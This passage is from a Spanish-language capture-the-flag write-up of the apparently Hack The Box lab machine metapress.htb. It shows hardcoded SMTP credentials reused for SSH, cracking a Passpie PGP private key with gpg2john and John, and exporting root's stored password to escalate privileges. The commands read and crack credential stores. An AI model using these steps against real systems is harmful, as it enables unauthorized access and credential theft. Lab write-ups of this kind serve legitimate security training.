150 Opening BINARY mode data connection for send_email.php (1126 bytes)
100% |******************************************************************************************|  1126      333.21 KiB/s    00:00 ETA
226 Transfer complete
1126 bytes received in 00:00 (8.04 KiB/s)
ftp> exit
221 Goodbye.
```

Veamos el contenido de este archivo:
```php
cat get_oauth_token.php 
<?php
/*
 * This script will be used to send an email to all our users when ready for launch
*/

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

$mail = new PHPMailer(true);

$mail->SMTPDebug = 3;                               
$mail->isSMTP();            

$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587;                                   

$mail->From = "jnelson@metapress.htb";
$mail->FromName = "James Nelson";

$mail->addAddress("info@metapress.htb");

$mail->isHTML(true);

$mail->Subject = "Startup";
$mail->Body = "<i>We just started our new blog metapress.htb!</i>";

try {
    $mail->send();
    echo "Message has been sent successfully";
} catch (Exception $e) {
    echo "Mailer Error: " . $mail->ErrorInfo;
}
```
Excelente, tenemos las credenciales para entrar al **servicio SSH**.

### Entrando al Servicio SSH {#SSH}

Pongamos las credenciales:
```bash
ssh jnelson@metapress.htb
The authenticity of host 'metapress.htb (10.10.11.186)' can't be established.
ED25519 key fingerprint is SHA256:0PexEedxcuaYF8COLPS2yzCpWaxg8+gsT1BRIpx/OSY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'metapress.htb' (ED25519) to the list of known hosts.
jnelson@metapress.htb's password: 
Linux meta2 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Oct 25 12:51:26 2022 from 10.10.14.23
jnelson@meta2:~$ whoami
jnelson
jnelson@meta2:~$ ls -la
total 32
drwxr-xr-x 4 jnelson jnelson 4096 Oct 25 12:53 .
drwxr-xr-x 3 root    root    4096 Oct  5  2022 ..
lrwxrwxrwx 1 root    root       9 Jun 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 jnelson jnelson  220 Jun 26  2022 .bash_logout
-rw-r--r-- 1 jnelson jnelson 3526 Jun 26  2022 .bashrc
drwxr-xr-x 3 jnelson jnelson 4096 Oct 25 12:51 .local
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .passpie
-rw-r--r-- 1 jnelson jnelson  807 Jun 26  2022 .profile
-rw-r----- 1 root    jnelson   33 Apr 14 18:22 user.txt
jnelson@meta2:~$ cat user.txt
```
Muy bien, es hora de convertirnos en **Root**.

## Post Explotación {#Post}

### Enumeración de la Máquina Víctima {#Enum}

Como siempre veamos qué privilegios tenemos y que archivos podemos aprovechar:
```bash
jnelson@meta2:~$ id
uid=1000(jnelson) gid=1000(jnelson) groups=1000(jnelson)
jnelson@meta2:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for jnelson: 
Sorry, try again.
[sudo] password for jnelson: 
sudo: 1 incorrect password attempt
```
No pues no, te voy a ahorrar el usar la herramienta **linpeas.sh** porque no encontré algo útil que nos pueda servir.

Si listamos otra vez los archivos, vemos un directorio interesante:
```bash
jnelson@meta2:~$ ls -la
total 32
drwxr-xr-x 4 jnelson jnelson 4096 Oct 25 12:53 .
drwxr-xr-x 3 root    root    4096 Oct  5  2022 ..
lrwxrwxrwx 1 root    root       9 Jun 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 jnelson jnelson  220 Jun 26  2022 .bash_logout
-rw-r--r-- 1 jnelson jnelson 3526 Jun 26  2022 .bashrc
drwxr-xr-x 3 jnelson jnelson 4096 Oct 25 12:51 .local
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .passpie
-rw-r--r-- 1 jnelson jnelson  807 Jun 26  2022 .profile
-rw-r----- 1 root    jnelson   33 Apr 14 18:22 user.txt
```
Uno llamado **Passpie**, investiguemos que es eso:

| **Herramienta Passpie** |
|:-----------:|
| *Passpie es una herramienta de línea de comandos para administrar contraseñas desde el terminal con una interfaz colorida y configurable.* |

Ósea, que podemos aprovecharnos de esto para escalar privilegios, veamos qué hay en esa carpeta.

Bueno, entremos ahí:
```bash
jnelson@meta2:~$ cd .passpie/
jnelson@meta2:~/.passpie$ ls -la
total 24
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .
drwxr-xr-x 4 jnelson jnelson 4096 Oct 25 12:53 ..
-r-xr-x--- 1 jnelson jnelson    3 Jun 26  2022 .config
-r-xr-x--- 1 jnelson jnelson 5243 Jun 26  2022 .keys
dr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 ssh
```

¿Llaves? Veamos que dice:
```bash
jnelson@meta2:~/.passpie$ cat .keys
-----BEGIN PGP PUBLIC KEY BLOCK-----

mQSuBGK4V9YRDADENdPyGOxVM7hcLSHfXg+21dENGedjYV1gf9cZabjq6v440NA1
AiJBBC1QUbIHmaBrxngkbu/DD0gzCEWEr2pFusr/Y3yY4codzmteOW6Rg2URmxMD
/GYn9FIjUAWqnfdnttBbvBjseL4sECpmgxTIjKbWAXlqgEgNjXD306IweEy2FOho
3LpAXxfk8C/qUCKcpxaz0G2k0do4+VTKZ+5UDpqM5++soJqhCrUYudb9zyVyXTpT
ZjMvyXe5NeC7JhBCKh+/Wqc4xyBcwhDdW+WU54vuFUthn+PUubEN1m+s13BkyvHV
gNAM4v6terRItXdKvgvHtJxE0vhlNSjFAedACHC4sN+dRqFu4li8XPIVYGkuK9pX
5xA6Nj+8UYRoZrP4SYtaDslT63ZaLd2MvwP+xMw2XEv8Uj3TGq6BIVWmajbsqkEp
tQkU7d+nPt1aw2sA265vrIzry02NAhxL9YQGNJmXFbZ0p8cT3CswedP8XONmVdxb
a1UfdG+soO3jtQsBAKbYl2yF/+D81v+42827iqO6gqoxHbc/0epLqJ+Lbl8hC/sG
WIVdy+jynHb81B3FIHT832OVi2hTCT6vhfTILFklLMxvirM6AaEPFhxIuRboiEQw
...
```

Veo una llave privada, vamos a descifrarla, para hacerlo usaremos otra vez **John** y si es necesario **Hashcat**. 

### Crackeando Llave de Passpie {#CrackPass}

Así que hagámoslo por pasos:

* Copiemos la llave privada en un archivo:
```bash
nano privkey.txt
-----BEGIN PGP PRIVATE KEY BLOCK-----
lQUBBGK4V9YRDADENdPyGOxVM7hcLSHfXg+21dENGedjYV1gf9cZabjq6v440NA1
AiJBBC1QUbIHmaBrxngkbu/DD0gzCEWEr2pFusr/Y3yY4codzmteOW6Rg2URmxMD
/GYn9FIjUAWqnfdnttBbvBjseL4sECpmgxTIjKbWAXlqgEgNjXD306IweEy2FOho
3LpAXxfk8C/qUCKcpxaz0G2k0do4+VTKZ+5UDpqM5++soJqhCrUYudb9zyVyXTpT
...
```

* Ahora vamos a convertir este archivo en uno con el cual la herramienta **John** pueda trabajar, pues no lo hace con cualquiera.
```bash
gpg2john privkey.txt > hash                          
File privkey.txt
```

* Por último desciframos el archivo:
```bash
john -w=/usr/share/wordlists/rockyou.txt hash         
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
blink182         (Passpie)     
1g 0:00:00:18 DONE (2023-04-14 16:20) 0.05437g/s 8.917p/s 8.917c/s 8.917C/s blink182
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Muy bien, tenemos la contraseña para **Passpie**. Pero ¿esto de qué nos sirve? Pues vamos a usar **Passpie** para cambiar o mostrar la contraseña del **Root**.

Si regresamos a la máquina, veremos que donde encontramos la llave privada del **Passpie**, hay un directorio llamado **SSH**, entremos:
```bash
jnelson@meta2:~/.passpie$ cd ssh
jnelson@meta2:~/.passpie/ssh$ ls -la
total 16
dr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 .
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 ..
-r-xr-x--- 1 jnelson jnelson  683 Oct 25 12:52 jnelson.pass
-r-xr-x--- 1 jnelson jnelson  673 Oct 25 12:52 root.pass
```

a...pues veamos qué hay en ese archivo:
```bash
jnelson@meta2:~/.passpie/ssh$ cat root.pass 
comment: ''
fullname: root@ssh
login: root
modified: 2022-06-26 08:58:15.621572
name: ssh
password: '-----BEGIN PGP MESSAGE-----

  hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2

  nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km
...
```
Bien, vamos a copiar esta contraseña, quítale la separación por renglones y guárdala. Lo que vamos a hacer será exportar la contraseña de Root para poder verla, el problema es que no podemos crear un archivo en donde estamos ni en ningún otro directorio con permisos de **Root**, por lo que hay que buscar uno.

En el que si podemos escribir es en **/dev/shm**, esto lo sé porque fui buscando en varios directorios desde la raíz, usando el comando **ls -ld**.

Ahora entremos ahí y crearemos el archivo con la llave de **Root** del **Passpie**:
```bash
jnelson@meta2:~/.passpie/ssh$ cd /dev/shm
jnelson@meta2:/dev/shm$ ls -la
total 0
drwxrwxrwt  2 root root   40 Apr 14 18:21 .
drwxr-xr-x 17 root root 3080 Apr 14 18:21 ..
jnelson@meta2:/dev/shm$ nano new.pass
```

Listemos las contraseñas que existen:
```bash
jnelson@meta2:/dev/shm$ passpie list
╒════════╤═════════╤════════════╤═══════════╕
│ Name   │ Login   │ Password   │ Comment   │
╞════════╪═════════╪════════════╪═══════════╡
│ ssh    │ jnelson │ ********   │           │
├────────┼─────────┼────────────┼───────────┤
│ ssh    │ root    │ ********   │           │
╘════════╧═════════╧════════════╧═══════════╛
```

Excelente, ahora para exportar la contraseña del **Root**, vamos a usar el comando **export** de **Passpie** y añadiendo el nombre del archivo donde está la contraseña. Al hacer esto nos pedirá la contraseña del **Passpie**, ponla y ya podremos ver la exportación:
```bash
jnelson@meta2:/dev/shm$ passpie export new.pass
Passphrase: 
jnelson@meta2:/dev/shm$ ls
new.pass
```

Ahora solo lee el archivo:
```bash
jnelson@meta2:/dev/shm$ cat new.pass 
credentials:
- comment: ''
  fullname: root@ssh
  login: root
  modified: 2022-06-26 08:58:15.621572
  name: ssh
  password: !!python/unicode 'p7qfAZt4_A1xo_0x'
- comment: ''
  fullname: jnelson@ssh
  login: jnelson
  modified: 2022-06-26 08:58:15.514422
  name: ssh
  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'
handler: passpie
version: 1.0
```

Y ahí está, ya solo identifícate como **Root** y obtén la flag.
```bash
jnelson@meta2:/dev/shm$ su root
Password: 
root@meta2:/dev/shm# whoami
root
root@meta2:/dev/shm# cd /root
root@meta2:~# ls
restore  root.txt
root@meta2:~# cat root.txt
```
